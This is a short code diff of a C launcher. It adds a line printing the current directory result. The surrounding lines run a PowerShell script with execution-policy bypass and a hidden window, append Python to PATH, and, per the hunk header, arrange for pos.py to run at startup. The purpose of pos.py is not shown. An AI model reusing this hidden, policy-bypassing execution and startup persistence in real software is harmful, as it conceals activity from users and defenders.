@@ -12,6 +12,8 @@ and triggering add_startup.py so that pos.py runs on startup.
 
 int main()
 {
+    DWORD dir = GetCurrentDirectory(0, NULL);
+    printf("%lu", dir);
     system("start /WAIT powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file \"Initialize_v1.ps1\""); //powershell script that checks if python is installed
     system("setx path \"%PATH%;C:\\Python38\\\"");
     system("setx path \"%PATH%;C:\\Python38\\Scripts\\\""); //adds the right path for pip
